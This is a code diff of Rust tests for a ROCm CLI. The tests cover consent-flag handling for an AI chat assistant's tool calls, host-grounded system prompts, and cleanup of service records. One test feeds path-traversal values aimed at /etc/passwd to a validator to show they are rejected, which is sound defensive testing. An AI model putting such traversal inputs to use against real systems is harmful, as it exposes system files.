+        // the `request plan` section above it did not show. The plan assertion at
+        // the top of this test is what makes the two lines differ here, so the
+        // disclosure and the difference are pinned by the same test.
+        assert!(
+            execution.consent_added,
+            "the plan arrived unapproved, so the injector must report adding the flag"
+        );
+        assert!(
+            rendered.contains("was added here from your --yes"),
+            "the execution section must explain the differing tool_call: {rendered}"
+        );
+        // Re-parsing must reach `install()` with the consent actually set.
+        let mut argv = vec!["rocm".to_owned()];
+        argv.extend(execution.action.args);
+        let cli = Cli::try_parse_from(argv).expect("generated argv should parse");
+        match cli.command {
+            Some(Command::Install {
+                target:
+                    InstallTarget::Sdk {
+                        yes,
+                        approve_replacing_active_default,
+                        ..
+                    },
+            }) => {
+                assert!(approve_replacing_active_default);
+                assert!(!yes);
+            }
+            other => panic!("expected `install sdk`, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn freeform_execution_consent_is_scoped_to_mutating_sdk_installs() {
+        // Dry runs return before the consent gate, and the sibling dry-run-aware
+        // arms in chat, rocmd and dash-tui all withhold the flag there.
+        let mut dry_run = vec![
+            "install".to_owned(),
+            "sdk".to_owned(),
+            "--dry-run".to_owned(),
+        ];
+        assert!(!apply_freeform_execution_consent(&mut dry_run));
+        assert_eq!(
+            dry_run,
+            vec![
+                "install".to_owned(),
+                "sdk".to_owned(),
+                "--dry-run".to_owned()
+            ]
+        );
+
+        // Nothing else the planner can emit takes this flag; injecting it would
+        // not even parse.
+        for mut args in [
+            vec!["install".to_owned(), "driver".to_owned()],
+            vec!["serve".to_owned(), "qwen".to_owned()],
+            vec!["comfyui".to_owned(), "install".to_owned()],
+        ] {
+            let before = args.clone();
+            assert!(!apply_freeform_execution_consent(&mut args));
+            assert_eq!(args, before);
+        }
+
+        // Idempotent: a plan that already carries the flag is not given it twice,
+        // and reports that it added nothing — the execution section must not
+        // claim to have added a flag the argv arrived with.
+        let mut already = vec![
+            "install".to_owned(),
+            "sdk".to_owned(),
+            "--approve-replacing-active-default".to_owned(),
+        ];
+        assert!(!apply_freeform_execution_consent(&mut already));
+        assert_eq!(
+            already
+                .iter()
+                .filter(|arg| *arg == "--approve-replacing-active-default")
+                .count(),
+            1
+        );
+    }
+
+    #[test]
     fn freeform_execution_header_surfaces_explicit_approval_and_tool_call() {
         let action =
             freeform_plan_next_action("serve qwen3.5 with vllm", &RocmCliConfig::default())
                 .expect("serve request should have next action");
-        let rendered = render_freeform_execution_header(&action);
+        let rendered = render_freeform_execution_header(&FreeformExecution {
+            action,
+            consent_added: false,
+        });
 
         assert!(rendered.contains("execution"));
         assert!(rendered.contains("approval: granted by --yes"));
         assert!(rendered.contains(
             "tool_call: rocm serve Qwen/Qwen3.5-4B --engine vllm --device gpu_required --managed"
         ));
+        // Nothing was injected on this path, so the two `tool_call:` lines agree
+        // and the disclosure would be noise that contradicts the plan above.
+        assert!(
+            !rendered.contains("was added here"),
+            "the note must be scoped to an argv this surface actually changed: {rendered}"
+        );
     }
 
     #[test]
@@ -19318,7 +24430,7 @@ mod tests {
         assert_eq!(
             rocm_chat_tool_requested_command(&call).as_deref(),
             Some(
-                "rocm install sdk --channel release --format wheel --prefix D:\\ROCm\\therock_venvs"
+                "rocm install sdk --channel release --format wheel --approve-replacing-active-default --prefix D:\\ROCm\\therock_venvs"
             )
         );
         let approval = chat_tool_approval_request(
@@ -19341,10 +24453,165 @@ mod tests {
                 "release".to_owned(),
                 "--format".to_owned(),
                 "wheel".to_owned(),
+                "--approve-replacing-active-default".to_owned(),
                 "--prefix".to_owned(),
                 "D:\\ROCm\\therock_venvs".to_owned(),
             ]
         );
+    }
+
+    #[test]
+    fn chat_install_sdk_strips_model_supplied_yes_and_skips_consent_on_dry_run() {
+        // `rocm_command` carries a model-supplied argv that nothing else filters,
+        // so `--yes` can arrive here. This arm exists to grant the narrow consent
+        // only; letting `--yes` through would re-grant the system-package/sudo
+        // consent on a spawn with no terminal to answer a password prompt.
+        let classify = |args: &[&str]| -> Vec<String> {
+            let action = chat_rocm_command_action_from_args(
+                args.iter().copied().map(str::to_owned).collect(),
+            )
+            .expect("install sdk should classify");
+            let ChatRocmCommandAction::Approval { args, .. } = action else {
+                panic!("install sdk is a mutating command");
+            };
+            args
+        };
+
+        assert_eq!(
+            classify(&["install", "sdk", "--prefix", "/tmp/therock", "--yes"]),
+            vec![
+                "install".to_owned(),
+                "sdk".to_owned(),
+                "--prefix".to_owned(),
+                "/tmp/therock".to_owned(),
+                "--approve-replacing-active-default".to_owned(),
+            ]
+        );
+
+        // A dry run returns before the consent gate, so it is not given a consent
+        // it never uses — matching the dry-run-aware sibling arms.
+        assert_eq!(
+            classify(&["install", "sdk", "--prefix", "/tmp/therock", "--dry-run"]),
+            vec![
+                "install".to_owned(),
+                "sdk".to_owned(),
+                "--prefix".to_owned(),
+                "/tmp/therock".to_owned(),
+                "--dry-run".to_owned(),
+            ]
+        );
+
+        // Both together: the strip is unconditional, so `--yes` still does not
+        // survive into a preview spawn, and the dry run still gains no consent.
+        // A model that emits both must not end up with either flag.
+        assert_eq!(
+            classify(&[
+                "install",
+                "sdk",
+                "--prefix",
+                "/tmp/therock",
+                "--yes",
+                "--dry-run",
+            ]),
+            vec![
+                "install".to_owned(),
+                "sdk".to_owned(),
+                "--prefix".to_owned(),
+                "/tmp/therock".to_owned(),
+                "--dry-run".to_owned(),
+            ]
+        );
+    }
+
+    #[test]
+    fn chat_install_sdk_strips_a_model_supplied_yes_in_both_its_bare_and_attached_forms() {
+        // `--yes` and `--yes=true` are both model-supplied argv that reach the
+        // chat arm intact: neither `canonicalize_chat_rocm_command` nor
+        // `validate_chat_rocm_command_safety` splits or rejects either. Whichever
+        // form survives re-grants into a null-stdin spawn the system-package/sudo
+        // consent `76c6aa3c` removed, with no terminal to answer the password
+        // prompt, so the strip has to catch both.
+        let classify = |args: &[&str]| -> Vec<String> {
+            let action = chat_rocm_command_action_from_args(
+                args.iter().copied().map(str::to_owned).collect(),
+            )
+            .expect("install sdk should classify");
+            let ChatRocmCommandAction::Approval { args, .. } = action else {
+                panic!("install sdk is a mutating command");
+            };
+            args
+        };
+
+        // Both terms of `arg != "--yes" && !arg.starts_with("--yes=")` are driven
+        // here, and each alone: the bare form is caught only by the first, the
+        // `=` forms only by the second, so dropping either term reddens this test
+        // on its own rather than leaving one half to a sibling.
+        for supplied in ["--yes", "--yes=true", "--yes=1", "--yes=false"] {
+            let args = classify(&["install", "sdk", "--prefix", "/tmp/therock", supplied]);
+            assert!(
+                !args.iter().any(|arg| arg.starts_with("--yes")),
+                "`{supplied}` must not survive the chat strip, got {args:?}"
+            );
+            assert_eq!(
+                args,
+                vec![
+                    "install".to_owned(),
+                    "sdk".to_owned(),
+                    "--prefix".to_owned(),
+                    "/tmp/therock".to_owned(),
+                    "--approve-replacing-active-default".to_owned(),
+                ],
+                "stripping `{supplied}` must leave the rest of the argv and the narrow consent alone"
+            );
+        }
+
+        // Future-proofing, not a guard on the `--yes=` term this test's other
+        // assertions pin: `--yes-not-a-flag` survives both the exact-match strip
+        // that preceded that term and the two-term strip that replaced it, so it
+        // would pass on either. What it does catch is the next edit — widening
+        // the second term to `starts_with("--yes")` to "simplify" it would start
+        // eating every argv token that merely begins the same way, silently
+        // dropping arguments the model legitimately sent.
+        let args = classify(&[
+            "install",
+            "sdk",
+            "--prefix",
+            "/tmp/therock",
+            "--yes-not-a-flag",
+        ]);
+        assert!(
+            args.iter().any(|arg| arg == "--yes-not-a-flag"),
+            "the strip must match `--yes` and `--yes=…`, not every token starting with \
+             `--yes`, got {args:?}"
+        );
+
+        // Second layer, and only the second: clap also refuses an attached value
+        // on this flag, so even an unstripped `--yes=true` would not parse today.
+        // That is what the strip above deliberately stops depending on — pinned
+        // here so a later `num_args` on `--yes` shows up as a failure of the
+        // backstop rather than passing unnoticed.
+        for attached in ["--yes=true", "--yes=1", "--yes=false"] {
+            let error = match Cli::try_parse_from(["rocm", "install", "sdk", attached]) {
+                Ok(cli) => panic!("`{attached}` must not parse, got {cli:?}"),
+                Err(error) => error,
+            };
+            assert_eq!(
+                error.kind(),
+                clap::error::ErrorKind::TooManyValues,
+                "expected clap to reject the attached value on {attached}: {error}"
+            );
+        }
+
+        // Control: the bare form does parse, so the assertions above are about
+        // the `=`-form and not about `--yes` being rejected outright.
+        let cli = Cli::try_parse_from(["rocm", "install", "sdk", "--yes"])
+            .expect("the bare flag is the form the chat arm strips");
+        match cli.command {
+            Some(Command::Install {
+                target: InstallTarget::Sdk { yes, .. },
+            }) => assert!(yes),
+            other => panic!("expected `install sdk`, got {other:?}"),
+        }
     }
 
     #[test]
@@ -19363,7 +24630,7 @@ mod tests {
         assert_eq!(
             rocm_chat_tool_requested_command(&call).as_deref(),
             Some(
-                "rocm install sdk --channel release --format wheel --prefix D:\\ROCm\\therock_venvs --build-date 06052026"
+                "rocm install sdk --channel release --format wheel --prefix D:\\ROCm\\therock_venvs --build-date 06052026 --approve-replacing-active-default"
             )
         );
         let approval =
@@ -19383,6 +24650,7 @@ mod tests {
                 "D:\\ROCm\\therock_venvs".to_owned(),
                 "--build-date".to_owned(),
                 "06052026".to_owned(),
+                "--approve-replacing-active-default".to_owned(),
             ]
         );
     }
@@ -19581,6 +24849,86 @@ mod tests {
         }
     }
 
+    /// The reported bug: asked "What can ROCm do on Windows?", the assistant
+    /// answered that ROCm is Windows-incompatible and suggested CUDA/DirectX —
+    /// because nothing ever told it which machine it was on. The prompt the CLI
+    /// actually sends must carry the host.
+    #[test]
+    fn assistant_prompt_states_the_host_it_is_answering_for() {
+        let prompt = rocm_chat_tool_system_prompt_for_host(None);
+
+        // The tool-use rules survive the composition (this is the same prompt,
+        // grounded — not a replacement for it).
+        assert!(
+            prompt.contains("You are ROCm CLI's local assistant"),
+            "the ROCm tool-use prompt must still be there:\n{prompt}"
+        );
+
+        // …and it now names this machine's OS and GPU state.
+        let expected_os = if cfg!(windows) {
+            "- Operating system: Windows"
+        } else {
+            "- Operating system: Linux"
+        };
+        assert!(
+            prompt.contains(expected_os),
+            "the prompt must state this machine's operating system:\n{prompt}"
+        );
+        assert!(
+            prompt.contains("- AMD GPU: "),
+            "the prompt must state what GPU was detected (or that none was):\n{prompt}"
+        );
+        assert!(
+            prompt.contains("Never tell the user ROCm is unavailable on their platform"),
+            "the prompt must refuse the reported answer:\n{prompt}"
+        );
+    }
+
+    /// The static prompt asserted two Windows-only facts at every host, which is
+    /// how a WSL user — where vLLM IS the supported path — was told to go use
+    /// WSL. Platform claims now come from the detected facts instead.
+    #[test]
+    fn assistant_prompt_makes_no_unconditional_windows_claims() {
+        let prompt = rocm_chat_tool_system_prompt();
+        assert!(
+            !prompt.contains("non-technical Windows users"),
+            "the audience is not assumed to be on Windows:\n{prompt}"
+        );
+        assert!(
+            !prompt.contains("On native Windows, vLLM is skipped"),
+            "the vLLM caveat belongs in the host facts, not the static prompt:\n{prompt}"
+        );
+
+        // Stated only where it is true: present on Windows, absent elsewhere.
+        let grounded = rocm_chat_tool_system_prompt_for_host(None);
+        assert_eq!(
+            grounded.contains("vLLM is skipped on native Windows"),
+            cfg!(windows),
+            "the vLLM caveat must track the host:\n{grounded}"
+        );
+    }
+
+    /// The prompt tells the model to "use examine … before answering". The dash
+    /// registers its machine check as `doctor`, so before the alias that
+    /// sentence named a tool absent from the dash's schema.
+    #[test]
+    fn every_tool_the_prompt_names_exists_in_the_dash_schema() {
+        let prompt = rocm_chat_tool_system_prompt();
+        for named in [
+            "examine",
+            "gpu_snapshot",
+            "port_status",
+            "natural_language_plan",
+        ] {
+            assert!(prompt.contains(named), "prompt should mention {named}");
+            assert!(
+                rocm_dash_tui::agent::ROCM_READ_TOOL_NAMES.contains(&named),
+                "the prompt names `{named}` but the dash never registers it, so a \
+                 model that obeys the prompt calls a tool the schema does not offer"
+            );
+        }
+    }
+
     #[test]
     fn deterministic_rocm_tool_summary_interprets_managed_runtime_as_installed() {
         let summary = deterministic_rocm_tool_summary(
@@ -19760,7 +25108,7 @@ model recipes
                     }),
                 },
                 Some(
-                    "rocm install sdk --channel release --format wheel --prefix D:\\ROCm\\therock_venvs",
+                    "rocm install sdk --channel release --format wheel --approve-replacing-active-default --prefix D:\\ROCm\\therock_venvs",
                 ),
                 false,
             ),
@@ -19770,7 +25118,7 @@ model recipes
                     name: "rocm_command".to_owned(),
                     arguments: serde_json::json!({ "args": ["comfyui", "install"] }),
                 },
-                Some("rocm comfyui install"),
+                Some("rocm comfyui install --yes"),
                 false,
             ),
             (
@@ -19817,7 +25165,7 @@ model recipes
         assert!(!chat_tool_call_is_read_only(&comfy_install));
         assert_eq!(
             rocm_chat_tool_requested_command(&comfy_install).as_deref(),
-            Some("rocm comfyui install")
+            Some("rocm comfyui install --yes")
         );
         let approval = chat_tool_approval_request(&comfy_install, Some("Install ComfyUI now."))
             .expect("approval should be built");
@@ -19825,7 +25173,11 @@ model recipes
         assert_eq!(approval.command_title, "ComfyUI");
         assert_eq!(
             approval.args,
-            vec!["comfyui".to_owned(), "install".to_owned()]
+            vec![
+                "comfyui".to_owned(),
+                "install".to_owned(),
+                "--yes".to_owned()
+            ]
         );
 
         let lemonade = providers::ChatToolCall {
@@ -20261,6 +25613,18 @@ model recipes
             vec!["comfyui".to_owned(), "logs".to_owned()],
             vec!["uninstall".to_owned(), "--dry-run".to_owned()],
             vec!["setup".to_owned(), "status".to_owned()],
+            vec![
+                "runtimes".to_owned(),
+                "uninstall".to_owned(),
+                "old-runtime".to_owned(),
+                "--dry-run".to_owned(),
+            ],
+            vec![
+                "runtimes".to_owned(),
+                "remove".to_owned(),
+                "old-runtime".to_owned(),
+                "--dry-run".to_owned(),
+            ],
         ];
         for args in read_only {
             let action = chat_rocm_command_action_from_args(args.clone())
@@ -20278,15 +25642,169 @@ model recipes
             vec!["comfyui".to_owned(), "stop".to_owned()],
             vec!["uninstall".to_owned()],
             vec!["setup".to_owned(), "reset".to_owned()],
+            vec![
+                "runtimes".to_owned(),
+                "uninstall".to_owned(),
+                "old-runtime".to_owned(),
+            ],
+            vec![
+                "runtimes".to_owned(),
+                "remove".to_owned(),
+                "old-runtime".to_owned(),
+            ],
         ];
         for args in mutating {
             let action = chat_rocm_command_action_from_args(args.clone())
                 .unwrap_or_else(|err| panic!("{args:?} should classify: {err}"));
-            assert!(
-                matches!(action, ChatRocmCommandAction::Approval { .. }),
-                "{args:?} should require approval, got {action:?}"
+            match &action {
+                ChatRocmCommandAction::Approval { args, .. } => {
+                    assert!(
+                        args.iter().any(|arg| arg == "--yes"),
+                        "{args:?} should have --yes injected for the approval path"
+                    );
+                }
+                other @ ChatRocmCommandAction::ReadOnly(_) => {
+                    panic!("{args:?} should require approval, got {other:?}")
+                }
+            }
+        }
+    }
+
+    /// Resolve the argv a non-interactive surface produces the way `install()`
+    /// does, so a test can assert what that argv actually consents to rather
+    /// than which flag string it happens to contain.
+    fn consents_for_install_sdk_argv(args: &[String]) -> SdkInstallConsents {
+        let cli =
+            Cli::try_parse_from(std::iter::once("rocm".to_owned()).chain(args.iter().cloned()))
+                .unwrap_or_else(|error| {
+                    panic!("{args:?} must parse as a `rocm` invocation: {error}")
+                });
+        let Some(Command::Install {
+            target:
+                InstallTarget::Sdk {
+                    yes,
+                    approve_replacing_active_default,
+                    ..
+                },
+        }) = cli.command
+        else {
+            panic!("{args:?} is not an `install sdk` invocation");
+        };
+        SdkInstallConsents::resolve(yes, approve_replacing_active_default)
+    }
+
+    #[test]
+    fn install_sdk_chat_and_mcp_args_approve_the_replacement_for_a_non_interactive_spawn() {
+        // The chat/MCP surfaces spawn `rocm` with null stdin, so the consent
+        // prompt would refuse with "re-run with
+        // `--approve-replacing-active-default`" — a flag the user has no way to
+        // supply from chat or the dashboard. Both the chat classifier
+        // arm and the MCP tool-args builder must inject the consent so an
+        // install over the active default runtime is not silently refused.
+        let action = chat_rocm_command_action_from_args(vec![
+            "install".to_owned(),
+            "sdk".to_owned(),
+            "--channel".to_owned(),
+            "release".to_owned(),
+            // The classifier requires a user-chosen (non-system) install folder.
+            "--prefix".to_owned(),
+            "/home/tester/rocm-managed".to_owned(),
+        ])
+        .expect("install sdk classifies");
+        let chat_args = match action {
+            ChatRocmCommandAction::Approval { args, .. } => args,
+            other @ ChatRocmCommandAction::ReadOnly(_) => {
+                panic!("install sdk must require approval, got {other:?}")
+            }
+        };
+
+        // The MCP `install_sdk` tool builds its own argv (it does not route
+        // through the classifier above), so it must add the flag independently.
+        let call = providers::ChatToolCall {
+            id: None,
+            name: "install_sdk".to_owned(),
+            arguments: serde_json::json!({ "channel": "release", "format": "wheel" }),
+        };
+        let mcp_args = rocm_chat_tool_requested_args(&call).expect("install_sdk tool builds args");
+
+        for args in [&chat_args, &mcp_args] {
+            assert_eq!(
+                consents_for_install_sdk_argv(args).replace_active_default,
+                therock::SdkInstallConsent::Preapproved(
+                    therock::SdkInstallApprovalSource::ApproveReplacingActiveDefault
+                ),
+                "the spawn must approve replacing the active default, and be credited \
+                 to the flag it actually passed rather than to --yes, got {args:?}"
             );
         }
+    }
+
+    #[test]
+    fn an_injected_consent_does_not_approve_privileged_package_installs() {
+        // The worked regression: Linux, a vLLM-preferred GPU family, OpenMPI
+        // absent, and neither root nor passwordless sudo. The chat, MCP and
+        // daemon surfaces spawn `rocm` with null stdin, so there is no terminal
+        // on which a `sudo` password prompt could ever be answered. Injecting
+        // `--yes` to clear the runtime-replacement prompt used to grant the
+        // second, unrelated consent that flag carries, which made
+        // `ensure_openmpi_for_vllm` run a sudo it cannot complete and then
+        // escalate the failure — aborting `maybe_auto_install_sdk_preferred_engine`
+        // before the vLLM engine install that previously warned and continued.
+        let call = providers::ChatToolCall {
+            id: None,
+            name: "install_sdk".to_owned(),
+            arguments: serde_json::json!({ "channel": "release", "format": "wheel" }),
+        };
+        let injected = consents_for_install_sdk_argv(
+            &rocm_chat_tool_requested_args(&call).expect("install_sdk tool builds args"),
+        );
+        assert_eq!(
+            injected.replace_active_default,
+            therock::SdkInstallConsent::Preapproved(
+                therock::SdkInstallApprovalSource::ApproveReplacingActiveDefault
+            )
+        );
+        assert!(
+            !injected.system_packages,
+            "an injected consent must not approve a privileged package install"
+        );
+        assert_eq!(
+            system_package_install_action(injected.system_packages, false),
+            SystemPackageInstallAction::PrintManualCommands,
+            "on a host without passwordless sudo the spawn must print the commands, not run sudo"
+        );
+
+        // And the other half of the property: a `--yes` the user actually typed
+        // still approves both, and a failure of the install it asked for is
+        // still an error rather than a warning.
+        let typed = consents_for_install_sdk_argv(&[
+            "install".to_owned(),
+            "sdk".to_owned(),
+            "--yes".to_owned(),
+        ]);
+        assert_eq!(
+            typed.replace_active_default,
+            therock::SdkInstallConsent::Preapproved(therock::SdkInstallApprovalSource::AssumeYes),
+            "a --yes the user typed must still be credited to --yes"
+        );
+        assert!(typed.system_packages);
+        assert_eq!(
+            system_package_install_action(typed.system_packages, false),
+            SystemPackageInstallAction::RunPlan {
+                approval: "granted by --yes",
+                escalate_failure: true,
+            },
+        );
+
+        // Root or passwordless sudo installs without any approval, as before —
+        // the consent split must not have made the automatic path conditional.
+        assert_eq!(
+            system_package_install_action(injected.system_packages, true),
+            SystemPackageInstallAction::RunPlan {
+                approval: "auto (root or passwordless sudo available)",
+                escalate_failure: false,
+            },
+        );
     }
 
     #[test]
@@ -21818,6 +27336,886 @@ install therock";
         Ok(())
     }
 
+    /// Plant a managed-service record plus every artifact it owns: the log and
+    /// endpoint key beside the manifest in `services_dir`, and the engine state
+    /// file under `<data>/engines/<engine>/state/`.
+    fn plant_service_record(
+        paths: &AppPaths,
+        service_id: &str,
+        status: &str,
+        supervisor_pid: u32,
+    ) -> Result<ManagedServiceRecord> {
+        let mut record = ManagedServiceRecord::new(
+            paths,
+            service_id,
+            "vllm",
+            "qwen",
+            "Qwen/Qwen3.5",
+            "127.0.0.1",
+            9,
+            "managed",
+            supervisor_pid,
+            None,
+            None,
+            Some("gpu_required".to_owned()),
+        );
+        status.clone_into(&mut record.status);
+        record.write()?;
+        fs::write(&record.log_path, "engine output\n")?;
+        fs::create_dir_all(
+            record
+                .engine_state_path
+                .parent()
+                .context("engine state path has a parent")?,
+        )?;
+        // Mirror the planted status: `refresh_from_engine_state` adopts whatever
+        // this file says, so a mismatched value would silently demote the record
+        // before the code under test ever sees it.
+        fs::write(
+            &record.engine_state_path,
+            serde_json::to_vec(&serde_json::json!({ "status": status }))?,
+        )?;
+        endpoint_keys::store_endpoint_api_key(paths, service_id, "test-key")?;
+        Ok(record)
+    }
+
+    #[test]
+    fn services_remove_deletes_every_artifact_and_leaves_the_shared_lock() -> Result<()> {
+        let (root, paths) = test_paths("services-remove-artifacts");
+        paths.ensure()?;
+        let record = plant_service_record(&paths, "svc-remove-me", "failed", 999_999_999)?;
+        // `launch.lock` lives in `services_dir` but belongs to every managed
+        // launch, not to one service. Removing a record must not touch it.
+        let lock = paths.managed_launch_lock_path();
+        fs::write(&lock, "")?;
+
+        let rendered = remove_managed_service_record(&paths, "svc-remove-me", true);
+        let rendered = match rendered {
+            Ok(text) => text,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let manifest_exists = record.manifest_path.exists();
+        let log_exists = record.log_path.exists();
+        let engine_state_exists = record.engine_state_path.exists();
+        let key_exists = endpoint_keys::endpoint_key_file_path(&paths, "svc-remove-me").exists();
+        let lock_exists = lock.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(!manifest_exists, "the details file must be deleted");
+        assert!(!log_exists, "the log must be deleted");
+        assert!(
+            !engine_state_exists,
+            "the engine state file must be deleted — it lives outside the services folder, \
+             so deleting only the two files beside the manifest is what orphans it"
+        );
+        assert!(!key_exists, "the endpoint key file must be deleted");
+        assert!(lock_exists, "the shared launch lock must be left alone");
+        assert!(rendered.contains("Local server record removed"));
+        assert!(rendered.contains("  files removed: 4"));
+        // The log path is the last thing worth knowing before it disappears.
+        assert!(
+            rendered.contains(&format!("  log: {}", record.log_path.display())),
+            "the log path must be printed before the delete:\n{rendered}"
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn services_remove_refuses_a_running_record_and_names_stop() -> Result<()> {
+        let (root, paths) = test_paths("services-remove-live");
+        paths.ensure()?;
+        // The current process is a guaranteed-live PID, so the liveness refresh
+        // keeps this record in a running state.
+        plant_service_record(&paths, "svc-live", "ready", std::process::id())?;
+
+        let error = remove_managed_service_record(&paths, "svc-live", true)
+            .expect_err("removing a running local server must fail");
+        let manifest_exists = paths.service_manifest_path("svc-live").exists();
+        let _ = fs::remove_dir_all(&root);
+
+        let message = error.to_string();
+        assert!(
+            message.contains("cannot be removed while it is running"),
+            "unexpected error: {message}"
+        );
+        assert!(
+            message.contains("rocm services stop svc-live --yes"),
+            "the error must name the stop command: {message}"
+        );
+        assert!(manifest_exists, "a refused removal must delete nothing");
+        Ok(())
+    }
+
+    /// A manifest still saying `ready` for a process that is gone is the common
+    /// case this command exists for. `load_managed_services` demotes it to
+    /// `stopped` while reading, so the live guard has to run on the refreshed
+    /// record — checking the status as it sits on disk would refuse forever.
+    #[test]
+    fn services_remove_accepts_a_stale_ready_record_that_refreshed_to_stopped() -> Result<()> {
+        let (root, paths) = test_paths("services-remove-stale-ready");
+        paths.ensure()?;
+        let record = plant_service_record(&paths, "svc-stale", "ready", 999_999_999)?;
+        assert_eq!(
+            serde_json::from_slice::<ManagedServiceRecord>(&fs::read(&record.manifest_path)?)?
+                .status,
+            "ready",
+            "premise: the manifest on disk still claims `ready`"
+        );
+
+        let result = remove_managed_service_record(&paths, "svc-stale", true);
+        let manifest_exists = record.manifest_path.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        result?;
+        assert!(!manifest_exists, "the stale record must be removable");
+        Ok(())
+    }
+
+    #[test]
+    fn services_remove_requires_yes() -> Result<()> {
+        let (root, paths) = test_paths("services-remove-yes");
+        paths.ensure()?;
+        plant_service_record(&paths, "svc-needs-yes", "failed", 999_999_999)?;
+
+        let error = remove_managed_service_record(&paths, "svc-needs-yes", false)
+            .expect_err("removal without --yes must fail");
+        let manifest_exists = paths.service_manifest_path("svc-needs-yes").exists();
+        let _ = fs::remove_dir_all(&root);
+
+        let message = error.to_string();
+        assert!(message.contains("requires --yes"), "unexpected: {message}");
+        assert!(
+            message.contains("rocm services remove svc-needs-yes --yes"),
+            "unexpected: {message}"
+        );
+        assert!(manifest_exists, "a refused removal must delete nothing");
+        Ok(())
+    }
+
+    #[test]
+    fn service_record_artifacts_reject_an_engine_that_escapes_the_state_dir() -> Result<()> {
+        let (root, paths) = test_paths("services-remove-traversal");
+        paths.ensure()?;
+
+        let by_engine = service_record_artifacts(&paths, "svc-ok", "../../../etc");
+        let by_id = service_record_artifacts(&paths, "../../etc/passwd", "vllm");
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(
+            by_engine.is_err(),
+            "an engine name with `..` must not reach a path this code deletes"
+        );
+        assert!(by_id.is_err(), "a traversing service id must be rejected");
+        Ok(())
+    }
+
+    #[test]
+    fn services_prune_skips_running_records_and_reports_the_count() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-live");
+        paths.ensure()?;
+        plant_service_record(&paths, "svc-dead", "failed", 999_999_999)?;
+        plant_service_record(&paths, "svc-running", "ready", std::process::id())?;
+
+        let outcome = prune_managed_service_records(&paths, 0, false, true);
+        let outcome = match outcome {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let dead_exists = paths.service_manifest_path("svc-dead").exists();
+        let running_exists = paths.service_manifest_path("svc-running").exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(!dead_exists, "the stopped record must be pruned");
+        assert!(running_exists, "a running record must be left alone");
+        assert_eq!(outcome.removed_records, 1);
+        assert_eq!(outcome.skipped_live, 1);
+        assert!(
+            outcome.text.contains("  still running, left alone: 1"),
+            "prune must report how many records it skipped:\n{}",
+            outcome.text
+        );
+        assert!(
+            outcome
+                .text
+                .contains("rocm services stop svc-running --yes"),
+            "the skip reason must name the stop command:\n{}",
+            outcome.text
+        );
+        Ok(())
+    }
+
+    /// The engine state file lives outside `services_dir`, so hand-deleting the
+    /// manifest and log — the workaround this command replaces — leaves it
+    /// behind forever. Prune has to sweep it.
+    #[test]
+    fn services_prune_sweeps_engine_state_left_behind_by_a_deleted_record() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-orphans");
+        paths.ensure()?;
+        let record = plant_service_record(&paths, "svc-orphaned", "failed", 999_999_999)?;
+        // Exactly what the manual workaround leaves: the two files in the
+        // services folder are gone, the engine state and endpoint key are not.
+        fs::remove_file(&record.manifest_path)?;
+        let orphan_state = record.engine_state_path;
+        let orphan_log = record.log_path;
+        let orphan_key = endpoint_keys::endpoint_key_file_path(&paths, "svc-orphaned");
+
+        let outcome = prune_managed_service_records(&paths, 0, false, true);
+        let outcome = match outcome {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let state_exists = orphan_state.exists();
+        let log_exists = orphan_log.exists();
+        let key_exists = orphan_key.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(
+            !state_exists,
+            "the orphaned engine state file must be swept:\n{}",
+            outcome.text
+        );
+        assert!(!log_exists, "the orphaned log must be swept");
+        assert!(!key_exists, "the orphaned endpoint key must be swept");
+        assert_eq!(outcome.removed_records, 0);
+        assert_eq!(outcome.removed_files, 3);
+        Ok(())
+    }
+
+    #[test]
+    fn services_prune_dry_run_reports_the_plan_and_removes_nothing() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-dry-run");
+        paths.ensure()?;
+        let record = plant_service_record(&paths, "svc-dry", "failed", 999_999_999)?;
+
+        let outcome = prune_managed_service_records(&paths, 0, true, false);
+        let outcome = match outcome {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let manifest_exists = record.manifest_path.exists();
+        let engine_state_exists = record.engine_state_path.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(manifest_exists, "--dry-run must not delete the record");
+        assert!(engine_state_exists, "--dry-run must not delete anything");
+        assert_eq!(outcome.removed_records, 0);
+        assert_eq!(outcome.removed_files, 0);
+        assert!(outcome.text.contains("- svc-dry (status: failed"));
+        assert!(
+            outcome
+                .text
+                .contains("Nothing was removed. Re-run without --dry-run to remove.")
+        );
+        Ok(())
+    }
+
+    /// The `--all` view advertises `rocm services restart <id> --yes` for every
+    /// record it lists. Pruning a server that died a minute ago would destroy
+    /// that affordance and the log explaining the failure, so the default age
+    /// gate keeps it.
+    #[test]
+    fn services_prune_default_age_keeps_a_just_stopped_record() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-age");
+        paths.ensure()?;
+        let record = plant_service_record(&paths, "svc-fresh", "failed", 999_999_999)?;
+
+        let outcome =
+            prune_managed_service_records(&paths, DEFAULT_SERVICE_PRUNE_MIN_AGE_HOURS, false, true);
+        let outcome = match outcome {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let manifest_exists = record.manifest_path.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(
+            manifest_exists,
+            "a record written seconds ago must survive the default prune:\n{}",
+            outcome.text
+        );
+        assert_eq!(outcome.removed_records, 0);
+        assert!(
+            outcome
+                .text
+                .contains("svc-fresh changed less than 24 hours ago"),
+            "prune must say why it was kept:\n{}",
+            outcome.text
+        );
+        Ok(())
+    }
+
+    /// The age gate reads the manifest's modification time, and
+    /// `load_managed_services` rewrites that manifest the first time it observes
+    /// that a `ready` server has died — a crash, a kill, a reboot. Read after
